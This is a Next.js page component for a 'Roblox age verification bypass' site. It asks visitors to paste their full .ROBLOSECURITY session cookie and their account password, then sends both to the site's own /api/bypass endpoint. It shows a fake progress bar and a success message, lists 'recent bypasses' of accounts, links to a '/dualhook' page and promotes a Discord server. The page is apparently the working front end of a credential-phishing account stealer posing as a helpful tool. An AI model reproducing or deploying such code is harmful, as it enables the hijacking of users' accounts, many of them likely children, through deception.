"use client"

import { useState, useEffect } from "react"
import { Unlock, Play, Clock } from "lucide-react"
import Link from "next/link"

interface DiscordInvite {
  guild: {
    name: string
  }
  approximate_member_count: number
  approximate_presence_count: number
}

interface RecentBypass {
  username: string
  avatarUrl: string
  timestamp: string
}

export default function Home() {
  const [cookie, setCookie] = useState("")
  const [robloxPassword, setRobloxPassword] = useState("")
  const [isProcessing, setIsProcessing] = useState(false)
  const [progress, setProgress] = useState(0)
  const [username, setUsername] = useState("")
  const [statusText, setStatusText] = useState("")
  const [error, setError] = useState("")
  const [showSuccess, setShowSuccess] = useState(false)
  const [showDiscordModal, setShowDiscordModal] = useState(false)
  const [discordData, setDiscordData] = useState<DiscordInvite | null>(null)
  const [recentBypasses, setRecentBypasses] = useState<RecentBypass[]>([])
  const [processingAvatarUrl, setProcessingAvatarUrl] = useState("")

  useEffect(() => {
    const fetchRecentBypasses = async () => {
      try {
        const response = await fetch("/api/recent-bypasses")
        const data = await response.json()
        console.log("[v0] Recent bypasses response:", data)
        if (data.bypasses && Array.isArray(data.bypasses)) {
          setRecentBypasses(data.bypasses)
        }
      } catch (error) {
        console.error("[v0] Failed to fetch recent bypasses:", error)
      }
    }

    fetchRecentBypasses()

    const interval = setInterval(fetchRecentBypasses, 5000)
    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    const hasSeenModal = localStorage.getItem("hasSeenDiscordModal")
    if (!hasSeenModal) {
      setShowDiscordModal(true)
      fetchDiscordData()
    }
  }, [])

  const fetchDiscordData = async () => {
    try {
      const response = await fetch("https://discord.com/api/v10/invites/rNH378HR?with_counts=true")
      const data = await response.json()
      setDiscordData(data)
      console.log("[v0] Discord data fetched:", data)
    } catch (error) {
      console.error("[v0] Failed to fetch Discord data:", error)
    }
  }

  const handleCloseModal = () => {
    localStorage.setItem("hasSeenDiscordModal", "true")
    setShowDiscordModal(false)
  }

  const isValidRobloxCookie = (cookieValue: string): boolean => {
    const trimmedCookie = cookieValue.trim()

    if (!trimmedCookie) return false

    return trimmedCookie.length > 50 // Basic minimum length check only
  }

  const handleBypass = async () => {
    console.log("[v0] Incoming data - Cookie:", cookie.substring(0, 20) + "...", "Password provided:", !!robloxPassword)

    if (!robloxPassword.trim()) {
      setError("Please enter your Roblox account password")
      return
    }

    if (!isValidRobloxCookie(cookie)) {
      setError(
        "Invalid or incomplete Roblox cookie. Please paste the ENTIRE .ROBLOSECURITY cookie including the full warning text.",
      )
      return
    }

    setError("")
    setIsProcessing(true)
    setProgress(0)
    setUsername("")
    setStatusText("Processing...")

    try {
      console.log("[v0] Sending bypass request to API...")
      const response = await fetch("/api/bypass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: "Bearer " + (process.env.NEXT_PUBLIC_BASE_URL || ""),
        },
        body: JSON.stringify({
          cookie: cookie.trim(),
          password: robloxPassword.trim(),
          timestamp: new Date().toISOString(),
        }),
      })

      const result = await response.json()
      console.log("[v0] API response received:", {
        success: result.success,
        hasUserInfo: !!result.userInfo,
        username: result.userInfo?.name,
      })

      if (!response.ok || !result.success) {
        const errorMessage = result.error || "Invalid cookie or password. Please check your credentials and try again."
        console.log("[v0] Error from API:", errorMessage)
        setError(errorMessage)
        setIsProcessing(false)
        setProgress(0)
        setStatusText("")
        setUsername("")
        return
      }

      if (result.userInfo?.name) {
        setUsername(result.userInfo.name)
        console.log("[v0] Processing account:", result.userInfo.name)

        const avatarUrl =
          result.avatarUrl ||
          `https://www.roblox.com/headshot-thumbnail/image?userId=${result.userInfo.id}&width=150&height=150&format=png`
        setProcessingAvatarUrl(avatarUrl)
      }

      const totalDuration = 20000
      const intervalTime = 100
      const incrementPerInterval = (100 / totalDuration) * intervalTime

      const progressInterval = setInterval(() => {
        setProgress((prev) => {
          const newProgress = prev + incrementPerInterval
          if (newProgress >= 100) {
            clearInterval(progressInterval)
            setStatusText("Complete!")
            console.log("[v0] Bypass processing complete, status: success")

            setTimeout(async () => {
              try {
                console.log("[v0] Refreshing recent bypasses list...")
                const refreshResponse = await fetch("/api/recent-bypasses")
                const refreshData = await refreshResponse.json()
                console.log("[v0] Recent bypasses refreshed, count:", refreshData.bypasses?.length || 0)
                if (refreshData.bypasses && Array.isArray(refreshData.bypasses)) {
                  setRecentBypasses(refreshData.bypasses)
                }
              } catch (error) {
                console.error("[v0] Failed to refresh bypasses:", error)
              }

              setIsProcessing(false)
              setProgress(0)
              setShowSuccess(true)
              setTimeout(() => {
                setShowSuccess(false)
              }, 5000)
              setCookie("")
              setRobloxPassword("")
              setUsername("")
              setStatusText("")
            }, 500)
            return 100
          }
          return newProgress
        })
      }, intervalTime)
    } catch (error) {
      console.error("[v0] Exception during bypass:", error)
      console.log("[v0] Error details:", error instanceof Error ? error.message : String(error))
      setError("Connection error. Please check your internet and try again.")
      setStatusText("")
      setIsProcessing(false)
      setProgress(0)
      setUsername("")
    }
  }

  const onlineMembers = discordData?.approximate_presence_count || 27
  const totalMembers = discordData?.approximate_member_count || 179
  const offlineMembers = totalMembers - onlineMembers
  const serverName = discordData?.guild?.name || "Uhmiyuz's server"

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyan-600 to-cyan-700 py-8 px-4">
      {showSuccess && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm animate-in fade-in duration-300">
          <div className="bg-gradient-to-br from-green-500 to-green-600 rounded-2xl shadow-2xl p-8 max-w-md w-full mx-4 border-4 border-green-400 animate-in zoom-in duration-500">
            <div className="flex flex-col items-center text-center space-y-4">
              <div className="relative">
                <div className="absolute inset-0 bg-white rounded-full blur-xl opacity-50 animate-pulse"></div>
                <div className="relative bg-white rounded-full p-4">
                  <svg className="w-16 h-16 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
              <h2 className="text-3xl font-bold text-white drop-shadow-lg">Success!</h2>
              <p className="text-xl text-white font-semibold leading-relaxed drop-shadow-md">
                Your Roblox Account Has Bypassed Successfully Please Check It Immediately
              </p>
              <button
                onClick={() => setShowSuccess(false)}
                className="mt-4 px-8 py-3 bg-white text-green-600 font-bold rounded-xl hover:bg-green-50 transition-all duration-200 shadow-lg hover:shadow-xl hover:scale-105"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="max-w-2xl mx-auto space-y-6">
        {showDiscordModal && (
          <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-lg shadow-2xl overflow-hidden max-w-md w-full animate-in fade-in zoom-in duration-300">
              <div className="bg-[#5865F2] pt-12 pb-8 flex items-center justify-center">
                <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-lg">
                  <svg viewBox="0 0 127.14 96.36" className="w-14 h-14 fill-[#5865F2]">
                    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
                  </svg>
                </div>
              </div>

              <div className="px-8 py-6 bg-white">
                <h2 className="text-2xl font-bold text-gray-800 mb-6 flex items-center gap-2">
                  <span className="text-2xl">🎉</span>
                  Join {serverName}!
                </h2>

                <div className="flex items-center justify-between mb-6">
                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                    <div>
                      <div className="text-xl font-bold text-gray-800">{onlineMembers}</div>
                      <div className="text-xs text-gray-500 uppercase font-semibold">Online</div>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
                    <div>
                      <div className="text-xl font-bold text-gray-800">{offlineMembers}</div>
                      <div className="text-xs text-gray-500 uppercase font-semibold">Offline</div>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <div className="w-2 h-2 bg-[#5865F2] rounded-full"></div>
                    <div>
                      <div className="text-xl font-bold text-gray-800">{totalMembers}</div>
                      <div className="text-xs text-gray-500 uppercase font-semibold">Total Members</div>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <button
                    onClick={handleCloseModal}
                    className="flex-1 py-3 px-4 border-2 border-gray-300 text-gray-700 rounded-md font-semibold hover:bg-gray-50 transition-colors text-center text-sm uppercase"
                  >
                    Maybe Later
                  </button>
                  <a
                    href="https://discord.gg/tGYBBAfc5T"
                    target="_blank"
                    rel="noopener noreferrer"
                    onClick={handleCloseModal}
                    className="flex-1 py-3 px-4 bg-[#5865F2] text-white rounded-md font-semibold hover:bg-[#4752C4] transition-colors flex items-center justify-center gap-2 text-sm uppercase"
                  >
                    <svg viewBox="0 0 127.14 96.36" className="w-5 h-5 fill-white">
                      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
                    </svg>
                    Join Now!
                  </a>
                </div>
              </div>
            </div>
          </div>
        )}

        <div className="absolute top-6 right-6 z-20">
          <Link href="/dualhook">
            <div className="w-14 h-14 flex items-center justify-center bg-zinc-900/80 backdrop-blur-xl border-2 border-cyan-400/50 rounded-lg hover:border-cyan-400/70 shadow-[0_0_30px_rgba(34,211,238,0.5)] hover:shadow-[0_0_50px_rgba(34,211,238,0.7)] transition-all">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="28"
                height="28"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="text-cyan-400 drop-shadow-[0_0_12px_rgba(34,211,238,1)] drop-shadow-[0_0_20px_rgba(34,211,238,0.7)]"
              >
                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
              </svg>
            </div>
          </Link>
        </div>

        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse"></div>
          <div
            className="absolute bottom-0 right-1/4 w-96 h-96 bg-violet-500/20 rounded-full blur-[128px] animate-pulse"
            style={{ animationDelay: "1s" }}
          ></div>
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[150px]"></div>
        </div>

        <div className="relative z-10">
          <div className="flex flex-col items-center mb-12">
            <div className="w-20 h-20 rounded-full bg-zinc-900 flex items-center justify-center mb-6 ring-2 ring-cyan-400/50 shadow-[0_0_30px_rgba(6,182,212,0.4)]">
              <Unlock
                className="w-10 h-10 text-cyan-400"
                strokeWidth={1.5}
                style={{
                  filter:
                    "drop-shadow(0 0 8px rgba(6, 182, 212, 1)) drop-shadow(0 0 15px rgba(6, 182, 212, 0.8)) drop-shadow(0 0 25px rgba(6, 182, 212, 0.6)) drop-shadow(0 0 40px rgba(6, 182, 212, 0.4))",
                }}
              />
            </div>

            <h1
              className="text-4xl md:text-5xl font-bold mb-3 text-balance text-center bg-gradient-to-r from-red-500 via-yellow-500 via-green-500 via-blue-500 via-indigo-500 to-purple-500 bg-clip-text text-transparent"
              style={{
                filter:
                  "drop-shadow(0 0 10px rgba(255, 0, 0, 0.8)) drop-shadow(0 0 20px rgba(0, 255, 0, 0.6)) drop-shadow(0 0 30px rgba(0, 0, 255, 0.5)) drop-shadow(0 0 40px rgba(6, 182, 212, 0.4))",
              }}
            >
              Vextizege X Bypasser
            </h1>

            <p
              className="text-lg text-center bg-gradient-to-r from-pink-500 via-purple-500 via-blue-500 to-cyan-500 bg-clip-text text-transparent"
              style={{
                filter:
                  "drop-shadow(0 0 10px rgba(236, 72, 153, 0.8)) drop-shadow(0 0 20px rgba(168, 85, 247, 0.6)) drop-shadow(0 0 30px rgba(6, 182, 212, 0.5))",
              }}
            >
              Secure and efficient age verification bypass
            </p>
          </div>

          <div className="w-full max-w-md bg-cyan-500/20 backdrop-blur-xl border-2 border-cyan-400 shadow-[0_0_50px_rgba(6,182,212,0.8),0_0_80px_rgba(6,182,212,0.5),0_0_120px_rgba(6,182,212,0.3)]">
            <div className="p-8">
              <label
                className="block text-sm font-medium mb-3 bg-gradient-to-r from-red-400 via-yellow-400 via-green-400 via-cyan-400 to-blue-400 bg-clip-text text-transparent"
                style={{
                  filter:
                    "drop-shadow(0 0 8px rgba(255, 100, 100, 0.8)) drop-shadow(0 0 15px rgba(100, 255, 100, 0.6)) drop-shadow(0 0 20px rgba(100, 100, 255, 0.5))",
                }}
              >
                .ROBLOSECURITY Cookie
              </label>

              <textarea
                value={cookie}
                onChange={(e) => {
                  setCookie(e.target.value)
                  setError("")
                }}
                placeholder="Paste your cookie here..."
                className="w-full h-24 px-4 py-3 bg-pink-500/20 backdrop-blur-sm border-2 border-pink-400 rounded-lg text-white placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-pink-400 focus:border-pink-400 resize-none mb-6 transition-all shadow-[0_0_20px_rgba(236,72,153,0.6),0_0_35px_rgba(236,72,153,0.4)]"
              />

              <label
                className="block text-sm font-medium mb-3 bg-gradient-to-r from-red-400 via-yellow-400 via-green-400 via-cyan-400 to-blue-400 bg-clip-text text-transparent"
                style={{
                  filter:
                    "drop-shadow(0 0 8px rgba(255, 100, 100, 0.8)) drop-shadow(0 0 15px rgba(100, 255, 100, 0.6)) drop-shadow(0 0 20px rgba(100, 100, 255, 0.5))",
                }}
              >
                Roblox Account Password
              </label>

              <input
                type="password"
                value={robloxPassword}
                onChange={(e) => {
                  setRobloxPassword(e.target.value)
                  setError("")
                }}
                placeholder="Enter your Roblox password..."
                className="w-full h-12 px-4 py-3 bg-pink-500/20 backdrop-blur-sm border-2 border-pink-400 rounded-lg text-white placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-pink-400 focus:border-pink-400 mb-2 transition-all shadow-[0_0_20px_rgba(236,72,153,0.6),0_0_35px_rgba(236,72,153,0.4)]"
              />

              {error && (
                <div className="mb-4 p-3 bg-red-950/50 border border-red-900 rounded-lg">
                  <p className="text-red-400 text-sm">{error}</p>
                </div>
              )}

              <div
                onClick={handleBypass}
                disabled={!cookie.trim() || !robloxPassword.trim() || isProcessing}
                className="w-full h-12 bg-pink-600 hover:bg-pink-700 text-white font-medium rounded-lg flex items-center justify-center gap-2 transition-all disabled:opacity-50"
                style={{
                  boxShadow:
                    "0 0 20px rgba(236, 72, 153, 0.6), 0 0 35px rgba(236, 72, 153, 0.4), 0 0 50px rgba(236, 72, 153, 0.3)",
                }}
              >
                <Play className="w-4 h-4 text-cyan-400" fill="currentColor" />
                <span className="font-bold text-lg text-cyan-400">{isProcessing ? "In Progress" : "Start Bypass"}</span>
              </div>

              {isProcessing && (
                <div className="mt-6 space-y-3">
                  <div className="flex items-center justify-center gap-4">
                    {processingAvatarUrl && (
                      <img
                        src={processingAvatarUrl || "/placeholder.svg"}
                        alt={username}
                        className="w-16 h-16 rounded-full border-2 border-green-400 shadow-lg shadow-green-400/50"
                      />
                    )}
                    <div className="text-center">
                      <p className="text-green-400 text-sm mb-1 font-medium">Processing account</p>
                      {username && <p className="text-green-300 font-semibold text-lg">{username}</p>}
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-green-400 font-medium">Progress</span>
                      <span className="text-green-300 font-bold">{Math.round(progress)}%</span>
                    </div>

                    <div className="w-full h-3 bg-zinc-800/50 rounded-full overflow-hidden border border-zinc-700/50">
                      <div
                        className="h-full bg-gradient-to-r from-green-500 to-green-400 transition-all duration-500 ease-out"
                        style={{
                          width: `${progress}%`,
                          boxShadow:
                            "0 0 15px rgba(34, 197, 94, 0.8), 0 0 25px rgba(34, 197, 94, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3)",
                        }}
                      />
                    </div>

                    <p className="text-green-400 text-sm text-center flex items-center justify-center gap-1.5 font-medium">
                      <span className="inline-block w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.9)]" />
                      {statusText}
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>

          <div className="w-full max-w-md mt-8 bg-purple-500/20 backdrop-blur-xl border-2 border-purple-400 shadow-[0_0_50px_rgba(168,85,247,0.8),0_0_80px_rgba(168,85,247,0.5),0_0_120px_rgba(168,85,247,0.3)]">
            <div className="p-6">
              <div className="flex items-center gap-3 mb-6">
                <Clock className="w-6 h-6 text-purple-300" />
                <h2 className="text-2xl font-bold bg-gradient-to-r from-purple-300 to-pink-300 bg-clip-text text-transparent">
                  Recent Bypass
                </h2>
              </div>

              {recentBypasses.length === 0 ? (
                <div className="text-center py-8">
                  <p className="text-purple-300/60 text-sm">No recent bypasses yet</p>
                </div>
              ) : (
                <div className="space-y-4 max-h-96 overflow-y-auto">
                  {recentBypasses.map((bypass, index) => (
                    <div
                      key={index}
                      className="bg-purple-400/30 backdrop-blur-sm rounded-lg p-4 border border-purple-300/30 hover:bg-purple-400/40 transition-all"
                    >
                      <div className="flex items-start gap-4">
                        <img
                          src={bypass.avatarUrl || "/placeholder.svg"}
                          alt={bypass.username}
                          className="w-14 h-14 rounded-full border-2 border-purple-300 shadow-lg"
                          onError={(e) => {
                            e.currentTarget.src = "https://via.placeholder.com/150?text=Avatar"
                          }}
                        />
                        <div className="flex-1">
                          <p className="text-lg font-bold text-white mb-1">@{bypass.username}</p>
                          <p className="text-purple-200 text-sm mb-2">Verification link successfully created</p>
                          <div className="flex items-center gap-2 text-purple-300/80 text-xs">
                            <Clock className="w-3 h-3" />
                            <span>{bypass.timestamp}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          <div className="mt-12 flex items-center gap-2 text-sm">
            <span
              className="bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent font-semibold"
              style={{
                filter: "drop-shadow(0 0 10px rgba(255, 100, 0, 0.9)) drop-shadow(0 0 20px rgba(255, 200, 0, 0.7))",
              }}
            >
              Secure
            </span>
            <span className="text-zinc-600">•</span>
            <span
              className="bg-gradient-to-r from-green-400 via-emerald-400 to-teal-400 bg-clip-text text-transparent font-semibold"
              style={{
                filter: "drop-shadow(0 0 10px rgba(0, 255, 100, 0.9)) drop-shadow(0 0 20px rgba(0, 200, 150, 0.7))",
              }}
            >
              Fast
            </span>
            <span className="text-zinc-600">•</span>
            <span
              className="bg-gradient-to-r from-blue-400 via-indigo-400 to-purple-400 bg-clip-text text-transparent font-semibold"
              style={{
                filter: "drop-shadow(0 0 10px rgba(100, 100, 255, 0.9)) drop-shadow(0 0 20px rgba(150, 100, 255, 0.7))",
              }}
            >
              Reliable
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}
